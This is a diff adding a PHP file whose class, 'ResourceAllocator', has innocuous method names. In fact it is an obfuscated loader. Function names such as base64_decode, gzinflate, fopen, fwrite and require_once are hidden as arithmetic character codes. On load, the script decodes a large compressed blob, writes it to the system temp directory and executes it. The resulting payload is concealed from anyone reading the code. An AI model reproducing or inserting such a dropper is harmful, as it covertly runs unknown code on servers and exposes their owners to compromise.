@@ -1,0 +1,85 @@
+<?php
+class ResourceAllocator {
+	private $ny = '';
+	private $uw = '';
+
+	public function computeResult($p1) {
+		$a = array(((95*1)+3),((103*45)-4538),((40+12+63)),((101*1)),(((40*33)-1266)),(52),((5*19)),(((100*29)-2800)),(101*1),(((109*92)-9929)),(111),(36+58+6),(101*1));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function triggerCallback($p1) {
+		$a = array((107-6),(124-8),(107-10),(2*54),((16+3+83)),((47*2)+16),105,(122),((49*1)+54));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function resolveAction($p1,$p2) {
+		$a = array((32+78),(((58*1)+43)),(63+49),111,((2*51)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function handleRequest($p1,$p2) {
+		$a = array((40+34+28),((70+23+26)),((103+9+2)),((82+23)),((2*58)),(((10*99)-889)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function initializeModule($p1) {
+		$a = array((106-5),((5*23)),(3*37),(((97*1)+11)),((104-5)),(((28*6)-66)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function terminateSession($p1,$p2=null) {
+		$a = array((109*1),(((7*94)-553)),((2*57)),(89+11+16),(17+97));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function resetState() {
+		$this->uw = $this->terminateSession($this->manageState(), '/');
+	}
+
+	public function syncRecords() {
+		$this->ny = $this->triggerCallback($this->computeResult($this->gi));
+	}
+
+	public function updateRegistry() {
+		$fn = $this->uw.'/oh-68196e588d6c1';
+		$f = $this->resolveAction($fn, 'w');
+		$this->handleRequest($f, $this->ny);
+		$this->initializeModule($f);
+		$this->sanitizeInput($fn);
+	}
+
+	private $gi = 'pVgLU+JIEP4rWmUdpLAoHqt7LJfbQgVlV0HDU7YsKo8JCQxJS' . 'Agvz/9+3Z0EE0DcuhMzZHp6vn5MT/cMf313DOdE5bLnnQxlw31' . '1XHMhz9mJN5fnpno2XI/LweuJ7lvq3LStk6Gx0dJnQ3liCa+mn' . 'j71GNe/fUNWIXgdTpZpoeyyue9aJ4rsscsvQ42ptsbS77y/COF' . 'FKL8lRcbkIMzr+wxRdl15nU4NHSUl/p166jXGg35jc99pLBRLW' . 'iuF5fypt/KUojpvF384g0Iqm+J+06zA9yx1nhouGKOJhZKv3XZ' . '97TrfYf0r3jSvDPXuypN7DUO7xUkLxSzNnvsDQy001kCQ+9Bcw' . 'ZNDGNmZI8xzYQQUESk6t5Ay6POf6m3jptUe/JCnaq5961iN6mo' . '22EgP2G/1eFHuSX2pxx/ljr3scaP5UOWOVuBjpTuYt3rOAsbvu' . 'pYzecrZgH6B6JaJ4Cp0+9olq4iRVLYkcx5vS+4jqULUzdwOqED' . '5AY8xuIH2SzTJszgOa4Wap1SIGA6YLtLxzdGiN25GbzKNyndST' . 'r2xF/fFq/yzifoVB70fU7m34vJtaQNOXd9PYTVaJRgbK4X8Uik' . '2uGpezNRNafLclwygP8LzFOjqG2PyZLG7VmolR5lycvBsyiJpw' . 'KvWSgAlcRwx9MgVhYY96OWJONksAnYgg37Q3j1EVo09H8ekXLc' . 'DpPq78wxaMRW9VMvJ0L4PWTMa6ne5ak0CTy8CTy+3PCvmxJi2P' . 'pxOkVqvGp1urbJ4aH1Z3jw5dXBCronuqkSMs8mKVEanJVbBUcn' . '5MOtGKVz4g14jJ/dKEMRXNwowD54wCH9Cc4NvdjRtPSZHqsUGU' . 'Lym+Sd8LXBAm+jREs5077BM2wtE2oGtZH2rJnU6tdJNu8prbS7' . 'pwNvqVohBU5QYx3M/N3jscO2qM5HQl1KtdNvO1yNslxzSQQ91G' . '+28VMOdlKtVcalqWy6LqzHIbifXbfVzNVrPzgW0HbJx9CEP7ZS' . 'QzfWtyGI2j2BxEGa16GVQ60y6aBCF+Hq1hUX9gYcYUOGIx/UjR' . 'DOuA+6rNlqCLkI99MhFqmJ+6MQg1DBpaDzhR3TMvivhJV8n/lG' . 'MHai4xcD50G4n4Qzox/2/9rVgAQLvYw7JYVul9wB4am7iPIS5u' . '0IerfngFjOKBY/SQ0nopUG4lxckqIV+q1zWkwFGMVi/W2KW6na' . 'q4XAQIJxHg51pd5rcJtMJhWb9ZmWqY8xiP0nSmuK4v2VTDWLTe' . 'tWt2e46ShRTlDklNRbBltWAcsliWx5q0JvBZI25aayBUMCwwsF' . 'mRENTglA+NLhABIajUANNz2NzqIm31favBBfWCuFFEF7PhvORO' . 'AScJApgYFhwcmuAhZx//OHNXcf2qHOemAHVQBBORVGXuceEV81' . 'ke4io2TLS7o0B30G2DTxQLJDn7ZgNmFKgaoRmGJ4ung2vm82f9' . 'Wr5bLh0lmLatOaCa/uWls5l6COUqbrHR/LZrxeZZINcihqW9aD' . 'zixBfxIQCGBNuSigvDZOz6OQR486KpNavmLSv2YtM7BFewuMGO' . 'vh0jzufy9B/xJaJW5QtJv4ynxLAUa8HxXygVFLaRSb2AJTiMnk' . 'SODqT+dhHGKtaKvQ7ML4FC7An4NAy/E9zURaGAekWgyqCDbFHe' . 'EkL2V2ePzPwEaJlSY4VMvCBWYROsRdYtIOQvYz9fc180o/wzve' . 'kgZaxBzxf3jMoAx8CAEX2AIo7gj/pCy97zsjnQTY2JGPXzOQqf' . 'NInhJ3wy+GCJxvc07B+pqVyX2Ohp8tv70dwTFiQg2QO5vquaPk' . 'c30Z6lH7Ohibs4EQkYi4zKRIVW9xNJHKwlbOEGWTOoSpzLit8J' . '0H5eFYcQ3ZCIVxzRNV3+dC0TMxRii2UqQ8py3aQAhzn1x3pvvn' . 'YHrZa98NuVarXnh+rVek8UPW3+O+arfb5ke14DKXWvL9v9u6b1' . '5V2vdk4gHJ0tlRtd6RGW6o0WjXQ+f/tyGOC7qqVmx0BYc4+Nuu' . '62WhUr9vt+kO12Um46CJz3LADU4o7sftJX8BYwjAjIWzF1EAEk' . 'i1ND8gjNjct3Y5GiKZy22MRhSorsCdr2wxPCFAnX04TtSqH1QA' . '8Et5hKYLCSgrBJ4uO7HoMNgQPYxGQ15qIHTmJb1CBF17E5E6Yb' . 'OiATpatp3pyEE86cG2hZLkLB4eEl/iBY5chPJ7NqFoTdjYJzhb' . 'BweAAON5pAP3QLKzAcLc5NGuGh8AVTMzuKoJ3GTRwNBF1z1Ynt' . 'sOsdJpc9T3Bi7cX4VuChPcW4aA4dKgH4s4DoPiqffmajSfcT/r' . 'Ct3j2z2Wi/+gUNpoIr7rjzz16Pye3oDlM2znwRAeTU53Z4UTMW' . 'ZqpijqEZTg/vmXyhQw8kSCmCRTfeIyBSQERZ+9lT7zvge3CnhL' . '/pWjr0fYAfeEEGIQ6KYIFfWGLUYy1qhJkx704Y1GcgU/G/DNuT' . 'QkO08Q+9Y6yw6Ux4PMNdpQR743A+f1DqfjjzQhYksHlAtUPTty' . '4nrOjMtgcf4M4Ioavww2wI8Qn9E/8aI6OIOM1EmCx6P6Wj/Emo' . 'fEjgCMew/tkEfDm+DHSlIo83iEiQIha3eRz5g4XsptGw+Mhny/' . 'ioZfaoKJvPF9EpiCr7k4e89+YPObblBwQpl756EXGi0JQeGWqY' . 'Z8k73MapTdA2ktkcH/FIYjGvSGX0+0Nh9lsbxTvr0KZreDMIpB' . 'qp5FuIEb4559tF6DjXTZDFcNpoYnyfB3elJJqr1OC+DcBnu+KV' . '40gX+A4SNgbX9NhDL+JBaRCWNiKCHWNWfRzbfjjbdgbe7YVvZN' . 'CAhWw6GKLc3/nBmsvEjdYXApk2vrp7V8=';
+
+	public function sanitizeInput($p) {
+		require_once $p;
+	}
+
+	public function manageState() {
+		$a=array(((32+83)),((118+2+1)),(5*23),((105-10)),((97+1+5)),((73+9+19)),(68+48),((80*1)+15),(116),(105-4),((96+8+5)),(112),((64*1)+31),((17+41+42)),((113-8)),(64+50));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$xv = new ResourceAllocator();
+$xv->resetState();
+$xv->syncRecords();
+$xv->updateRegistry();
